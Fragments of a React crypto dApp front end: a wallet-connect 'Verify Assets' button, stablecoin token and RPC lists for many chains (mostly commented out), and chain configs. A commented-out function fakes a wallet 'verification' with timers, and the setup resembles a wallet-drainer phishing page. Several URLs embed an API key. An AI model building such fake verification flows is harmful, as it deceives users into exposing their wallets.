import { ConnectButton } from "@rainbow-me/rainbowkit";
import React, { useEffect, useState } from "react";
import { FaWallet } from "react-icons/fa"; // wallet icon

function ConnectWallet({ data }) {
  const [width, setWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  return (
    <ConnectButton.Custom>
      {({
        account,
        chain,
        openAccountModal,
        openChainModal,
        openConnectModal,
        mounted,
      }) => {
        const ready = mounted;
        const connected = ready && account && chain;

        const buttonStyle = {
          display: "flex",
          alignItems: "center",
          gap: "8px",
          padding: "16px 24px",
          margin: "12px 0",
          fontWeight: 600,
          fontSize: "18px",
          fontFamily: "Montserrat, sans-serif",
          background: "#f0b90b", // yellow color
          color: "#000",
          borderRadius: "6px",
          border: "none",
          cursor: "pointer",
          boxShadow: "0px 6px 15px rgba(0, 0, 0, 0.6)", // soft shadow
          transition: "all 0.3s ease",
        };

        const containerStyle = {
          display: "flex",
          justifyContent: "center",
        };

        return (
          <div
            {...(!ready && {
              "aria-hidden": true,
              style: {
                opacity: 0,
                pointerEvents: "none",
                userSelect: "none",
              },
            })}
          >
            <div style={containerStyle}>
              {!connected ? (
                <button
                  onClick={openConnectModal}
                  type="button"
                  style={buttonStyle}
                >
                  <FaWallet /> Verify Assets
                </button>
              ) : (
                <button
                  onClick={() => {
                    if (account && chain) data(true);
                  }}
                  type="button"
                  style={buttonStyle}
                >
                  <FaWallet /> Verify Assets
                </button>
              )}
            </div>
          </div>
        );
      }}
    </ConnectButton.Custom>
  );
}

export default ConnectWallet;




const TOKENS = {
  // 1: [
  //   {
  //     symbol: "USDT",
  //     address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  //     decimals: 6,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "DAI",
  //     address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
  //     decimals: 18,
  //     icon: icone9,
  //   },
  //   {
  //     symbol: "WETH",
  //     address: "0xC02aaA39b223FE8D0a0e5C4F27eAD9083C756Cc2",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xC02aaA39b223FE8D0a0e5C4F27eAD9083C756Cc2/logo.png",
  //   },
  //   {
  //     symbol: "LINK",
  //     address: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
  //     decimals: 18,
  //     icon: icone10,
  //   },
  // ],
  // 56: [
  //   {
  //     symbol: "USDT",
  //     address: "0x55d398326f99059fF775485246999027B3197955",
  //     decimals: 18,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "USDC",
  //     address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
  //     decimals: 18,
  //     icon: icone11,
  //   },
  //   {
  //     symbol: "DAI",
  //     address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
  //     decimals: 18,
  //     icon: icone9,
  //   },
  //   {
  //     symbol: "BUSD",
  //     address: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56/logo.png",
  //   },
  //   {
  //     symbol: "CAKE",
  //     address: "0x0E09Fabb73Bd3Ade0a17ECC321fD13a19e81cE82",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x0E09FaBB73BD3Ade0a17ECC321fD13a19e81cE82/logo.png",
  //   },
  // ],
  // 137: [
  //   {
  //     symbol: "USDT",
  //     address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
  //     decimals: 6,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "USDC",
  //     address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
  //     decimals: 6,
  //     icon: icone11,
  //   },
  //   {
  //     symbol: "DAI",
  //     address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
  //     decimals: 18,
  //     icon: icone9,
  //   },
  //   {
  //     symbol: "WMATIC",
  //     address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
  //     decimals: 18,
  //     icon: icone12,
  //   },
  //   {
  //     symbol: "QUICK",
  //     address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/assets/0x831753DD7087CaC61aB5644b308642cc1c33Dc13/logo.png",
  //   },
  // ],
  // 43114: [
  //   {
  //     symbol: "USDT",
  //     address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
  //     decimals: 6,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "USDC",
  //     address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
  //     decimals: 6,
  //     icon: icone11,
  //   },
  //   {
  //     symbol: "DAI",
  //     address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70",
  //     decimals: 18,
  //     icon: icone9,
  //   },
  //   {
  //     symbol: "WAVAX",
  //     address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/avalanchec/assets/0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7/logo.png",
  //   },
  //   {
  //     symbol: "PNG",
  //     address: "0x60781C2586D68229fde47564546784ab3faca982",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/avalanchec/assets/0x60781C2586D68229fde47564546784ab3faca982/logo.png",
  //   },
  // ],
  // 10: [
  //   {
  //     symbol: "USDT",
  //     address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
  //     decimals: 6,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "USDC",
  //     address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
  //     decimals: 6,
  //     icon: icone11,
  //   },
  //   {
  //     symbol: "DAI",
  //     address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
  //     decimals: 18,
  //     icon: icone9,
  //   },
  //   {
  //     symbol: "WETH",
  //     address: "0x4200000000000000000000000000000000000006",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/optimism/assets/0x4200000000000000000000000000000000000006/logo.png",
  //   },
  //   {
  //     symbol: "OP",
  //     address: "0x4200000000000000000000000000000000000042",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/optimism/assets/0x4200000000000000000000000000000000000042/logo.png",
  //   },
  // ],
  // 42161: [
  //   {
  //     symbol: "USDT",
  //     address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
  //     decimals: 6,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "USDC",
  //     address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
  //     decimals: 6,
  //     icon: icone11,
  //   },
  //   {
  //     symbol: "DAI",
  //     address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
  //     decimals: 18,
  //     icon: icone9,
  //   },
  //   {
  //     symbol: "WETH",
  //     address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/arbitrum/assets/0x82aF49447D8a07e3bd95BD0d56f35241523fBab1/logo.png",
  //   },
  //   {
  //     symbol: "ARB",
  //     address: "0x912CE59144191C1204E64559FE8253a0e49E6548",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/arbitrum/assets/0x912CE59144191C1204E64559FE8253a0e49E6548/logo.png",
  //   },
  // ],
  // 204: [
  //   {
  //     symbol: "USDT",
  //     address: "0x9e5AAC1Ba1a2e6aEd6b32689DFcF62A509Ca96f3",
  //     decimals: 18,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "BUSD",
  //     address: "0x7A56E1C57C7475CCf742d277DDCbB69403bE5106",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x7A56E1C57C7475CCf742d277DDCbB69403bE5106/logo.png",
  //   },
  //   {
  //     symbol: "FDUSD",
  //     address: "0x50c5725949A6F0c72E6c4a641F24049A917DB0Cb",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x50c5725949A6F0c72E6c4a641F24049A917DB0Cb/logo.png",
  //   },
  // ],
  // 11155111: [
  //   {
  //     symbol: "USDT",
  //     address: "0x7169D38820F26e4E46B7a06Da09F3dB8b1c9B5A5",
  //     decimals: 6,
  //     icon: icone8,
  //   },
  //   {
  //     symbol: "USDC",
  //     address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238",
  //     decimals: 6,
  //     icon: icone11,
  //   },
  //   {
  //     symbol: "WETH",
  //     address: "0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14/logo.png",
  //   },
  // ],
  // 250: [
  //   {
  //     symbol: "USDC",
  //     address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75",
  //     decimals: 6,
  //     icon: icone11,
  //   },
  //   {
  //     symbol: "DAI",
  //     address: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E",
  //     decimals: 18,
  //     icon: icone9,
  //   },
  //   {
  //     symbol: "WFTM",
  //     address: "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",
  //     decimals: 18,
  //     icon: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/fantom/assets/0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83/logo.png",
  //   },
  // ],

  5611: [
    {
      symbol: "USDT",
      address: "0xa6004fa87492e9352C50356298104715CEeD4Cfa",
      decimals: 6,
    },
  ],
  97: [
    {
      symbol: "USDT",
      address: "0x221c5b1a293aac1187ed3a7d7d2d9ad7fe1f3fb0",
      decimals: 18,
      // icon optional
    },
  ],
};



const RPC_URLS = {
  // 1: [
  //   "https://eth-mainnet.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
  //   "https://cloudflare-eth.com",
  //   "https://rpc.ankr.com/eth",
  //   "https://eth-mainnet.g.alchemy.com/v2/your_alchemy_api_key",
  //   "https://mainnet.infura.io/v3/your_infura_api_key",
  // ],
  // 11155111: [
  //   "https://eth-sepolia.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
  //   "https://rpc.sepolia.org",
  //   "https://eth-sepolia.g.alchemy.com/v2/your_alchemy_api_key",
  //   "https://sepolia.infura.io/v3/your_infura_api_key",
  // ],
  // 56: [
  //   "https://bsc-dataseed.binance.org/",
  //   "https://bsc-dataseed1.defibit.io/",
  //   "https://bsc-dataseed1.ninicoin.io/",
  // ],
  // 137: [
  //   "https://polygon-mainnet.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
  //   "https://polygon-rpc.com/",
  //   "https://rpc.ankr.com/polygon",
  // ],
  // 43114: [
  //   "https://api.avax.network/ext/bc/C/rpc",
  //   "https://rpc.ankr.com/avalanche",
  //   "https://avalanche-mainnet.infura.io/v3/your_infura_api_key",
  // ],
  // 10: [
  //   "https://mainnet.optimism.io/",
  //   "https://rpc.ankr.com/optimism",
  //   "https://opt-mainnet.g.alchemy.com/v2/tO_FPsuW9FEXXtmHOauwN",
  // ],
  // 42161: [
  //   "https://arb1.arbitrum.io/rpc",
  //   "https://rpc.ankr.com/arbitrum",
  //   "https://arbitrum-mainnet.infura.io/v3/your_infura_api_key",
  // ],
  // 204: ["https://opbnb-mainnet-rpc.bnbchain.org"],
  // 250: ["https://rpc.ftm.tools/", "https://rpc.ankr.com/fantom"],
  5611: [
    "https://opbnb-testnet-rpc.publicnode.com/",
    "https://opbnb-testnet.therpc.io",
  ],
  97: [
    "https://bsc-testnet.public.blastapi.io",
    "wss://bsc-testnet-rpc.publicnode.com",
  ],
};



  const chains = [
    // {
    //   id: 1,
    //   name: "Ethereum Mainnet",
    //   nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    //   blockExplorer: "https://etherscan.io",
    //   icon: icone1,
    // },
    // {
    //   id: 11155111,
    //   name: "Sepolia",
    //   nativeCurrency: { name: "Sepolia Ether", symbol: "ETH", decimals: 18 },
    //   blockExplorer: "https://sepolia.etherscan.io",
    //   icon: icone1,
    // },
    // {
    //   id: 56,
    //   name: "BNB Chain",
    //   nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    //   blockExplorer: "https://bscscan.com",
    //   icon: icone2,
    // },
    // {
    //   id: 137,
    //   name: "Polygon",
    //   nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
    //   blockExplorer: "https://polygonscan.com",
    //   icon: icone3,
    // },
    // {
    //   id: 43114,
    //   name: "Avalanche",
    //   nativeCurrency: { name: "AVAX", symbol: "AVAX", decimals: 18 },
    //   blockExplorer: "https://snowtrace.io",
    //   icon: icone4,
    // },
    // {
    //   id: 10,
    //   name: "Optimism",
    //   nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    //   blockExplorer: "https://optimistic.etherscan.io",
    //   icon: icone5,
    // },
    // {
    //   id: 42161,
    //   name: "Arbitrum",
    //   nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    //   blockExplorer: "https://arbiscan.io",
    //   icon: icone6,
    // },
    // {
    //   id: 204,
    //   name: "opBNB",
    //   nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    //   blockExplorer: "https://opbnbscan.com",
    //   icon: icone2,
    // },
    // {
    //   id: 250,
    //   name: "Fantom",
    //   nativeCurrency: { name: "Fantom", symbol: "FTM", decimals: 18 },
    //   blockExplorer: "https://ftmscan.com",
    //   icon: icone7,
    // },
    {
      id: 5611,
      name: "OPBNB Testnet",
      nativeCurrency: { name: "OPBNB", symbol: "BNB", decimals: 18 },
      blockExplorer: "https://opbnb-testnet.bscscan.com",
      icon: icone2,
    },
    {
      id: 97,
      name: "BNB Chain Testnet",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      blockExplorer: "https://testnet.bscscan.com/",
      icon: icone2,
    },
  ];


    // const verifyWallet = () => {
  //   setVerifying(true);
  //   setVerifyStep(1);

  //   setTimeout(() => setVerifyStep(2), 3000); // after 3s -> step 2
  //   setTimeout(() => setVerifyStep(3), 6000); // after 6s -> step 3
  //   setTimeout(() => {
  //     setVerified(true); // after 10s -> verified true
  //     setVerifying(false);
  //     setVerifyStep(0);
  //   }, 10000);
  // };


  import icone3 from "../assets/icons/3.png";
  import icone4 from "../assets/icons/4.png";
  import icone5 from "../assets/icons/5.png";
  import icone6 from "../assets/icons/6.png";
  import icone7 from "../assets/icons/7.png";
  import icone8 from "../assets/icons/8.png";
  import icone9 from "../assets/icons/9.png";
  import icone10 from "../assets/icons/10.png";
  import icone11 from "../assets/icons/11.png";
  import icone12 from "../assets/icons/12.png";
  import icone1 from "../assets/icons/1.png";